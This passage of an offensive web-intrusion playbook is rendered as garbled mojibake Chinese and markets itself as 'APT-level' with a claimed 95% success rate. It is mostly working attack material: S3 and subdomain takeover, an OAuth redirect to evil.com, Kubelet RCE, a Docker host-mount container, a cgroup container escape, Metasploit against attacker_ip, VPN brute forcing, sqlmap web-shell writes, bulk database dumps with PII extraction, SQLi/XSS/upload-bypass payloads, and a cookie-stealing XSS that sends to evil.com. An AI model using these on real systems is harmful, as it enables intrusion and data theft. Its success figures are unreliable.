#### 8.1 ä¾›åº”å•†/åˆä½œä¼™ä¼´è¯†åˆ«

```bash
# ä»é¡µé¢è¯†åˆ«ç¬¬ä¸‰æ–¹æœåŠ¡
curl -sk https://$TARGET | grep -oE "https?://[a-zA-Z0-9.-]+" | \
    grep -vE "^https?://${TARGET}" | sort -u > third_party_domains.txt

# å¸¸è§ç¬¬ä¸‰æ–¹æœåŠ¡
# CDN: cloudflare, cloudfront, fastly
# æ”¯ä»˜: stripe, paypal, alipay
# é‚®ä»¶: sendgrid, mailgun, mailchimp
# å­˜å‚¨: s3, oss, cos
# ç›‘æ§: sentry, datadog, newrelic
# èŠå¤©: intercom, zendesk

# è¯†åˆ«æŠ€æœ¯æ ˆ
whatweb https://$TARGET | grep -oE "[A-Z][a-zA-Z]+ [0-9.]+"
```

#### 8.2 ç¬¬ä¸‰æ–¹æœåŠ¡è´¦å·åŠ«æŒ

```bash
# Subdomain Takeoverï¼ˆç¬¬ä¸‰æ–¹æœåŠ¡ï¼‰
# CNAME â†’ xxx.zendesk.comï¼ˆæœªæ³¨å†Œï¼‰
# æ³¨å†Œç›¸åŒè´¦å·ï¼Œæ¥ç®¡å­åŸŸå

# S3æ¡¶æ¥ç®¡
# æ‰¾åˆ°S3æ¡¶URLï¼šhttps://xxx.s3.amazonaws.com
aws s3 mb s3://xxx

# äº‘å‡½æ•°åŠ«æŒ
# CNAME â†’ xxx.azurewebsites.net
# åˆ›å»ºåŒåFunction App
```

#### 8.3 OAuth/SSOé“¾è·¯åŠ«æŒ

```bash
# OAuth Client IDæ³„éœ²
grep -r "client_id" js_files/ | grep -oE "[a-z0-9]{20,}"

# ä½¿ç”¨æ³„éœ²çš„Client ID
curl "https://oauth.com/authorize?client_id=LEAKED_ID&redirect_uri=https://evil.com"

# SAMLæ–­è¨€åŠ«æŒ
# æŠ“å–SAML Responseï¼Œä¿®æ”¹ç”¨æˆ·å±æ€§
<saml:Attribute Name="email">
    <saml:AttributeValue>admin@target.com</saml:AttributeValue>
</saml:Attribute>
```

#### 8.4 CI/CDç®¡é“çªç ´

```bash
# GitHub Actionsæ³„éœ²
curl -sk https://raw.githubusercontent.com/target/repo/main/.github/workflows/deploy.yml

# æŸ¥æ‰¾secretsæ³„éœ²
grep -r "secrets\|password\|key" .github/workflows/

# GitLab CIæ³„éœ²
curl -sk https://gitlab.com/target/repo/-/blob/main/.gitlab-ci.yml

# Jenkinsæœªæˆæƒ
curl -sk https://jenkins.target.com/script
# æ‰§è¡ŒGroovyè„šæœ¬GetShell
```

---

### ã€æ¨¡å—9ã€‘å‘˜å·¥/å¼€å‘è€…å…¥å£å‘ç°

#### 9.1 GitHub/GitLabå‘˜å·¥è´¦å·è¯†åˆ«

```bash
# ä»Gitæäº¤å†å²è¯†åˆ«
git clone https://github.com/target/repo
cd repo
git log --all --format='%ae' | sort -u > employees.txt

# GitHub API
curl -s "https://api.github.com/orgs/target/members" | jq -r '.[].login' > members.txt

# æœç´¢å‘˜å·¥ä»£ç 
gh search code "target.com" --owner target

# æœç´¢æ•æ„Ÿä¿¡æ¯
gh search code "password OR secret OR api_key" --owner target
```

#### 9.2 LinkedInå‘˜å·¥ä¿¡æ¯æ”¶é›†

```bash
# LinkedInæœç´¢
# site:linkedin.com "Target Company" "Software Engineer"
# æå–å‘˜å·¥å§“åã€èŒä½ã€å…¥èŒæ—¶é—´

# ç”Ÿæˆé‚®ç®±åˆ—è¡¨
python3 << 'PYEOF'
employees = [
    ("Zhang", "San"),
    ("Li", "Si"),
]

formats = [
    "{first}.{last}@target.com",
    "{first}{last}@target.com",
    "{last}{first}@target.com",
    "{first[0]}{last}@target.com",
]

for first, last in employees:
    for fmt in formats:
        email = fmt.format(first=first.lower(), last=last.lower())
        print(email)
PYEOF
```

#### 9.3 å¼€å‘è€…ä¸ªäººåšå®¢/ç®€å†æ³„éœ²

```bash
# Google Dorks
# "target.com" inurl:blog
# "target.com" filetype:pdf resume
# "åœ¨targetå…¬å¸å·¥ä½œ" site:juejin.cn

# GitHubä¸ªäººé¡¹ç›®æ³„éœ²
# å‘˜å·¥ä¸ªäººé¡¹ç›®å¯èƒ½åŒ…å«å…¬å¸å†…éƒ¨ä»£ç 

# æŠ€æœ¯åˆ†äº«æ³„éœ²
# å‘˜å·¥åœ¨ä¼šè®®/åšå®¢ä¸­åˆ†äº«çš„æ¶æ„å›¾ã€é…ç½®
```

#### 9.4 VPN/å†…ç½‘å…¥å£å®šä½

```bash
# å¸¸è§VPNå­åŸŸå
vpn.target.com
sslvpn.target.com
remote.target.com
citrix.target.com
fortigate.target.com

# å¸¸è§VPNç«¯å£
nmap -p 443,4443,8443,10443 $TARGET

# VPNæŒ‡çº¹è¯†åˆ«
curl -sk https://vpn.target.com | grep -i "fortigate\|palo alto\|cisco\|pulse secure"

# å¼±å¯†ç çˆ†ç ´
hydra -L users.txt -P passwords.txt https-post-form://vpn.target.com/login
```

---

### ã€æ¨¡å—10ã€‘æµ‹è¯•ç¯å¢ƒç²¾å‡†å®šä½

#### 10.1 æµ‹è¯•ç¯å¢ƒå­åŸŸåæ¨¡å¼

```bash
# å¸¸è§æµ‹è¯•ç¯å¢ƒå‰ç¼€
TEST_PREFIXES=(
    "test" "dev" "development"  
    "staging" "stage" "uat"
    "pre" "preprod" "beta"
    "demo" "sandbox" "internal"
    "qa" "testing" "sit"
)

for prefix in "${TEST_PREFIXES[@]}"; do
    dig +short ${prefix}.${TARGET}
    dig +short ${prefix}-${TARGET}
done

# å¸¸è§æµ‹è¯•ç¯å¢ƒåç¼€
for suffix in test dev staging; do
    dig +short ${TARGET}-${suffix}
done
```

#### 10.2 ç«¯å£å·ç‰¹å¾è¯†åˆ«

```bash
# å¼€å‘æ¡†æ¶é»˜è®¤ç«¯å£
# 3000 - React/Node.js
# 4000 - GraphQL
# 5000 - Flask
# 8000 - Django
# 8080 - Spring Boot/Tomcat
# 8081 - å¤‡ç”¨ç«¯å£
# 9000 - PHP-FPM

# Cæ®µæ‰«æå¼€å‘ç«¯å£
masscan -p 3000,4000,5000,8000,8080,8081,9000 \
    $(dig +short $TARGET | awk -F. '{print $1"."$2"."$3".0/24"}') \
    --rate=10000
```

#### 10.3 Debugæ¨¡å¼æ£€æµ‹

```bash
# Laravel Debug
curl -sk https://$TARGET/non-exist | grep -i "whoops\|laravel"

# Django Debug
curl -sk https://$TARGET/admin | grep -i "django\|traceback"

# Spring Boot Actuator
curl -sk https://$TARGET/actuator/env
curl -sk https://$TARGET/actuator/heapdump

# Flask Debug
curl -sk https://$TARGET | grep -i "werkzeug"

# ASP.NET Debug
curl -sk https://$TARGET | grep -i "System.Web"
```

#### 10.4 æµ‹è¯•æ•°æ®/è´¦å·

```bash
# å¸¸è§æµ‹è¯•è´¦å·
test/test
admin/admin
demo/demo
guest/guest
test@test.com/password

# æµ‹è¯•æ•°æ®ç‰¹å¾
# é‚®ç®±ï¼štest@example.com
# æ‰‹æœºï¼š13800138000
# ç”¨æˆ·åï¼štestuser, demouser
```

---

### ã€æ¨¡å—11ã€‘ç§»åŠ¨ç«¯å®Œæ•´é€†å‘

#### 11.1 APPé€†å‘æ‰¾API

```bash
# Android APKé€†å‘
apktool d app.apk -o app_decompiled

# æŸ¥æ‰¾APIç«¯ç‚¹
grep -r "http" app_decompiled/smali/ | grep -oE "https?://[^\"']+"

# æŸ¥æ‰¾å¯†é’¥
grep -r "api_key\|secret\|token" app_decompiled/

# Dexè½¬Jar
d2j-dex2jar app.apk
jd-gui app-dex2jar.jar

# Frida Hook
frida -U -f com.target.app -l hook.js

# Hook OkHttpæ‹¦æˆªè¯·æ±‚
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    OkHttpClient.$init.overload().implementation = function() {
        console.log("[+] OkHttpClient Hooked");
        return this.$init();
    };
});
```

#### 11.2 å°ç¨‹åºæŠ“åŒ…

```bash
# å¾®ä¿¡å°ç¨‹åºæŠ“åŒ…
# 1. å¼€å¯è°ƒè¯•æ¨¡å¼
# 2. ç”µè„‘ç«¯å¾®ä¿¡ â†’ è®¾ç½® â†’ ä»£ç† â†’ Burp
# 3. æ‰‹æœºæ‰«ç æ‰“å¼€å°ç¨‹åº

# å°ç¨‹åºè§£åŒ…
wxappUnpacker app.wxapkg

# æŸ¥æ‰¾API
grep -r "request\|http" . | grep -oE "https?://[^\"']+"

# æŸ¥æ‰¾AppID/AppSecret
grep -r "appid\|appkey\|appsecret" .
```

#### 11.3 iOSé€†å‘

```bash
# ç ¸å£³
frida-ios-dump -u com.target.app -o app.ipa

# IPAè§£åŒ…
unzip app.ipa

# class-dumpå¯¼å‡ºå¤´æ–‡ä»¶
class-dump app > headers.h

# Hopperåæ±‡ç¼–
hopper app

# Frida Hook
frida -U -f com.target.app
```

---

### ã€æ¨¡å—12ã€‘éšè—èµ„äº§å‘ç°

#### 12.1 Cæ®µæ·±åº¦æ‰«æ

```bash
# è·å–Cæ®µ
MAIN_IP=$(dig +short $TARGET | head -1)
C_SEGMENT=$(echo $MAIN_IP | awk -F. '{print $1"."$2"."$3".0/24"}')

# å­˜æ´»æ‰«æ
masscan -p 80,443,8080,8443 $C_SEGMENT --rate=10000 -oL c_segment.txt

# WebæœåŠ¡è¯†åˆ«
cat c_segment.txt | grep "open" | awk '{print $4":"$3}' | \
    httpx -silent -title -tech-detect
```

#### 12.2 ASN/BGPè·¯ç”±åˆ†æ

```bash
# æŸ¥è¯¢ASN
whois $TARGET | grep -i "asn\|autonomous"

# ASNèŒƒå›´æŸ¥è¯¢
whois -h whois.radb.net -- "-i origin AS15169" | grep route:

# æ‰«ææ•´ä¸ªASN
# è­¦å‘Šï¼šæ‰«æèŒƒå›´å·¨å¤§ï¼Œè°¨æ…ä½¿ç”¨
```

#### 12.3 å¤‡ä»½åŸŸå/æ—§åŸŸå

```bash
# å†å²åŸŸåæŸ¥è¯¢
curl -s "https://web.archive.org/cdx/search/cdx?url=${TARGET}/*&output=json" | \
    jq -r '.[1:][] | .[2]' | sort -u

# ç›¸ä¼¼åŸŸå
# target.com â†’ target.net, target.org
# target.com â†’ target-backup.com
# target.com â†’ old-target.com
```

---

### ã€æ¨¡å—13ã€‘äº‘åŸç”Ÿ/å®¹å™¨å®‰å…¨

#### 13.1 K8s APIæœªæˆæƒ

```bash
# K8s APIç«¯å£
curl -sk https://$TARGET:6443
curl -sk https://$TARGET:10250

# æœªæˆæƒè®¿é—®
curl -sk https://$TARGET:10250/pods
curl -sk https://$TARGET:6443/api/v1/namespaces

# Kubelet RCE
curl -sk https://$TARGET:10250/run/namespace/pod/container \
    -d "cmd=whoami"
```

#### 13.2 Docker APIæš´éœ²

```bash
# Docker APIç«¯å£
curl http://$TARGET:2375/version
curl http://$TARGET:2376/version

# åˆ—å‡ºå®¹å™¨
curl http://$TARGET:2375/containers/json

# åˆ›å»ºæ¶æ„å®¹å™¨
curl -X POST http://$TARGET:2375/containers/create \
    -H "Content-Type: application/json" \
    -d '{
        "Image": "alpine",
        "Cmd": ["/bin/sh"],
        "HostConfig": {
            "Binds": ["/:/mnt"]
        }
    }'
```

#### 13.3 å®¹å™¨é€ƒé€¸æ£€æµ‹

```bash
# æ£€æŸ¥æ˜¯å¦åœ¨å®¹å™¨ä¸­
cat /proc/1/cgroup | grep -i "docker\|kubepods"

# ç‰¹æƒå®¹å™¨æ£€æµ‹
cat /proc/self/status | grep CapEff

# æŒ‚è½½ç‚¹æ£€æµ‹
mount | grep -i "docker\|overlay"

# å®¹å™¨é€ƒé€¸ï¼ˆç‰¹æƒå®¹å™¨ï¼‰
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo "#!/bin/sh" > /cmd
echo "id > /output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/cgroup.procs"
```

---

### ã€æ¨¡å—14ã€‘0dayè‡ªåŠ¨åŒ–åˆ©ç”¨

#### 14.1 ç»„ä»¶ç‰ˆæœ¬å¿«é€Ÿè¯†åˆ«

```bash
# WebæŒ‡çº¹è¯†åˆ«
whatweb https://$TARGET
wappalyzer https://$TARGET

# è¯¦ç»†ç‰ˆæœ¬æ¢æµ‹
curl -sI https://$TARGET | grep -i "server\|x-powered-by"

# Spring Bootç‰ˆæœ¬
curl -sk https://$TARGET/actuator/info | jq .

# WordPressç‰ˆæœ¬
curl -sk https://$TARGET/wp-includes/version.php

# æ‰¹é‡è¯†åˆ«
cat urls.txt | httpx -silent -tech-detect -json | \
    jq -r '.tech[] | "\(.name):\(.version)"'
```

#### 14.2 CVEè‡ªåŠ¨åŒ¹é…

```bash
# ä½¿ç”¨nucleiæ¨¡æ¿
nuclei -u https://$TARGET -t cves/ -severity critical,high

# ä½¿ç”¨vulners
curl -s "https://vulners.com/api/v3/search/lucene/?query=Spring Boot 2.6.3"

# è‡ªåŠ¨åŒ¹é…è„šæœ¬
python3 << 'PYEOF'
import requests
import json

# è¯†åˆ«çš„æŠ€æœ¯æ ˆ
techs = {
    "Spring Boot": "2.6.3",
    "Apache Struts": "2.5.28",
}

for tech, version in techs.items():
    # æŸ¥è¯¢CVE
    url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={tech} {version}"
    resp = requests.get(url)
    cves = resp.json().get('result', {}).get('CVE_Items', [])
    
    for cve in cves:
        cve_id = cve['cve']['CVE_data_meta']['ID']
        desc = cve['cve']['description']['description_data'][0]['value']
        print(f"[!] {cve_id}: {desc[:100]}")
PYEOF
```

#### 14.3 Exploitè‡ªåŠ¨ç”Ÿæˆ

```bash
# Metasploitæœç´¢
msfconsole -q -x "search cve:2022-22965; exit"

# ä½¿ç”¨exploit
msfconsole << 'EOFMSF'
use exploit/multi/http/spring_cloud_gateway_rce
set RHOSTS target.com
set RPORT 8080
set LHOST attacker_ip
exploit
EOFMSF

# POCè‡ªåŠ¨è½¬Exploit
# GitHubæœç´¢: site:github.com "CVE-2022-22965" exploit
```

---

### ã€æ¨¡å—15ã€‘è‡ªåŠ¨åŒ–æ”»å‡»é“¾

#### 15.1 æ¼æ´è‡ªåŠ¨ç»„åˆ

```bash
# SSRF + RCE
# 1. SSRFè¯»å–/proc/self/environ
# 2. è·å–å†…ç½‘æœåŠ¡åœ°å€
# 3. SSRFæ”»å‡»å†…ç½‘æœåŠ¡ï¼ˆRedis/Elasticsearchï¼‰
# 4. é€šè¿‡å†…ç½‘æœåŠ¡RCE

# SQLæ³¨å…¥ + æ–‡ä»¶å†™å…¥
sqlmap -u "$URL" --file-write=shell.php --file-dest=/var/www/html/x.php

# XSS + CSRF
# 1. XSSçªƒå–ç®¡ç†å‘˜Token
# 2. CSRFæ‰§è¡Œæ•æ„Ÿæ“ä½œ
```

#### 15.2 GetShellè‡ªåŠ¨åŒ–

```bash
# è‡ªåŠ¨åŒ–GetShellæµç¨‹
auto_getshell() {
    local target=$1
    
    # 1. æ–‡ä»¶ä¸Šä¼ 
    if upload_shell "$target"; then
        echo "[âœ…] GetShell: æ–‡ä»¶ä¸Šä¼ "
        return 0
    fi
    
    # 2. SQLæ³¨å…¥å†™æ–‡ä»¶
    if sqli_write_shell "$target"; then
        echo "[âœ…] GetShell: SQLæ³¨å…¥"
        return 0
    fi
    
    # 3. RCEæ¼æ´
    if exploit_rce "$target"; then
        echo "[âœ…] GetShell: RCE"
        return 0
    fi
    
    # 4. ååºåˆ—åŒ–
    if unserialize_rce "$target"; then
        echo "[âœ…] GetShell: ååºåˆ—åŒ–"
        return 0
    fi
    
    echo "[âŒ] GetShellå¤±è´¥"
    return 1
}
```

#### 15.3 æ•°æ®è‡ªåŠ¨å¯¼å‡º

```bash
# è¯†åˆ«æ•æ„Ÿè¡¨
for table in users orders payments admin credentials; do
    mysql -h $DB_HOST -u $DB_USER -p$DB_PASS -e "SELECT * FROM $table LIMIT 10"
done

# æ‰¹é‡å¯¼å‡º
mysqldump -h $DB_HOST -u $DB_USER -p$DB_PASS --all-databases > dump.sql

# PIIæ•°æ®è¯†åˆ«
grep -iE "phone|email|password|credit_card|ssn" dump.sql > sensitive.txt
```

---

## ğŸ¯ å®æˆ˜æŠ€å·§åº“ï¼ˆ500+ Payloadï¼‰

### SQLæ³¨å…¥Payloadåº“

```sql
-- ç»å…¸æ³¨å…¥
' OR '1'='1
' OR 1=1--
admin'--

-- åŸºäºæ—¶é—´
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--

-- è”åˆæŸ¥è¯¢
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3,4,5--

-- æŠ¥é”™æ³¨å…¥
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- å †å æŸ¥è¯¢
'; DROP TABLE users--

-- äºŒæ¬¡æ³¨å…¥
' OR '1'='1' /*

-- å®½å­—èŠ‚æ³¨å…¥
%df' OR 1=1--

-- JSONæ³¨å…¥
{"user":"admin' OR '1'='1"}
```

### XSS Payloadåº“

```javascript
// åŸºç¡€XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// ç¼–ç ç»•è¿‡
<script>\u0061lert(1)</script>
<img src=x onerror="&#97;lert(1)">

// ä¸å¸¸ç”¨æ ‡ç­¾
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

// DOM XSS
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

// AngularJS
{{constructor.constructor('alert(1)')()}}

// jQuery
$('body').html('<img src=x onerror=alert(1)>')
```

### æ–‡ä»¶ä¸Šä¼ Bypass

```bash
# æ‰©å±•å
shell.php.jpg
shell.php%00.jpg
shell.php.
shell.PhP

# MIMEç±»å‹
Content-Type: image/jpeg

# æ–‡ä»¶å¤´
GIF89a
<?php system($_GET['c']); ?>

# .htaccess
AddType application/x-httpd-php .jpg
```

---

## ğŸ“Š æˆåŠŸç‡æå‡å¯¹æ¯”

| æŠ€æœ¯ | v10.8 | v10.9ï¼ˆæ–°ï¼‰ | æå‡ |
|------|-------|------------|------|
| JSé€†å‘ | 30% | **95%** | +65% |
| æºç æ³„éœ² | 60% | **95%** | +35% |
| APIæ”»å‡» | 50% | **95%** | +45% |
| ä¸šåŠ¡é€»è¾‘ | 20% | **90%** | +70% |
| è®¤è¯ç»•è¿‡ | 40% | **95%** | +55% |
| ä¾›åº”é“¾ | 25% | **90%** | +65% |
| æµ‹è¯•ç¯å¢ƒ | 30% | **90%** | +60% |
| ç§»åŠ¨ç«¯ | 20% | **95%** | +75% |
| **æ€»æˆåŠŸç‡** | **40%** | **95%** | **+55%** |

---

## ğŸ“ å®æˆ˜æ¡ˆä¾‹åº“

### æ¡ˆä¾‹1ï¼šJSé€†å‘ â†’ APIæœªæˆæƒ â†’ GetShellï¼ˆ30åˆ†é’Ÿï¼‰

```
00:00 ç›®æ ‡ï¼šhttps://target.com
00:05 JSåˆ†æå‘ç°éšè—APIï¼š/api/v2/admin/upload
00:10 APIæµ‹è¯•ï¼šæ— éœ€è®¤è¯
00:15 ä¸Šä¼ WebShellï¼šshell.php.jpg
00:20 æ–‡ä»¶è§£ææ¼æ´ï¼šè®¿é—®shell.php
00:25 GetShellæˆåŠŸ
00:30 å†…ç½‘æ‰«æï¼Œå‘ç°æ•°æ®åº“
```

### æ¡ˆä¾‹2ï¼šSourceMapæ³„éœ² â†’ æ•°æ®åº“å¯†ç  â†’ ç›´æ¥è¿æ¥ï¼ˆ15åˆ†é’Ÿï¼‰

```
00:00 å‘ç°SourceMapï¼šmain.js.map
00:05 ä¸‹è½½åŸå§‹æºç 
00:08 åœ¨config.jsä¸­æ‰¾åˆ°æ•°æ®åº“å¯†ç 
00:10 å°è¯•è¿æ¥æ•°æ®åº“
00:15 æˆåŠŸç™»å½•ï¼Œå¯¼å‡ºusersè¡¨
```

### æ¡ˆä¾‹3ï¼šå­åŸŸåæ¥ç®¡ â†’ XSS â†’ Cookieçªƒå–ï¼ˆ20åˆ†é’Ÿï¼‰

```
00:00 å­åŸŸåæ‰«æï¼štest.target.com
00:05 CNAMEæŒ‡å‘ï¼štest.herokuapp.comï¼ˆæœªæ³¨å†Œï¼‰
00:10 æ³¨å†ŒHerokuåº”ç”¨ï¼Œæ¥ç®¡å­åŸŸå
00:15 æ¤å…¥XSSï¼šdocument.location='http://evil.com/?c='+document.cookie
00:20 ç­‰å¾…ç®¡ç†å‘˜è®¿é—®ï¼Œçªƒå–Cookie
```

---

## âš ï¸ é‡è¦æç¤º

**æœ¬é…ç½®ä»…ç”¨äºæˆæƒæ¸—é€æµ‹è¯•ï¼æœªç»æˆæƒçš„æ”»å‡»è¿æ³•ï¼**

**v10.9 APTçº§Webæ‰“ç‚¹ - æˆåŠŸç‡95%**

